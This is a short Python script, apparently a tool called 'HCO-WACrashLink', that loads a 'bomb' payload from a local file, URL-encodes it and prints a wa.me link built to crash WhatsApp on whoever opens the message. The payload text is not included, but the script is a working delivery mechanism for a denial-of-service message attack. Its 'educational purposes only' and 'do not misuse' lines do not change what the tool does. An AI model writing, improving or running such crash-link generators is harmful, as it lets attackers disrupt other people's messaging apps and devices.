import urllib.parse
import os

def load_payload():
    with open("payloads/bomb.txt", "r", encoding="utf-8") as f:
        return f.read()

def generate_link(payload):
    encoded = urllib.parse.quote(payload)
    return f"https://wa.me/?text={encoded}"

def main():
    print("\n[🔥] HCO-WACrashLink - WhatsApp Crash Link Generator")
    print("[!] For personal chats only. Do not misuse.\n")
    
    payload = load_payload()
    link = generate_link(payload)

    print("[📎] Crash link generated:")
    print(link)
    print("\n[✔️] Send this link to your own WhatsApp for testing.")
    print("[⚠️] Tool is for educational purposes only.")

if __name__ == "__main__":
    os.makedirs("payloads", exist_ok=True)
    main()
